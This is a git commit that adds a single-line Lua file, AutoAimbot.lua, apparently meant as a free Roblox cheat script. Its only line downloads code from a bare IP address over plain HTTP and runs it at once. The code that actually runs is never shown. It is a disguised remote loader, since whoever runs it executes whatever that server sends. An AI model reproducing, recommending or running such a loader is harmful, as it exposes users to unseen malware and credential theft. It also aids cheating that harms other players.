dccf4ab397536a5d8c4ec4ec1f114c6bd2a45bfc
Free-Keyless-Script <wakzz69@gmail.com>
2026-03-01 00:21:29 +0800

    Create AutoAimbot.lua

---
+++ AutoAimbot.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjE0ZTk1YWNkLWVhZmEtNDc0Ny1iOWZkLWFiOWI5MTFjMzhmYiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
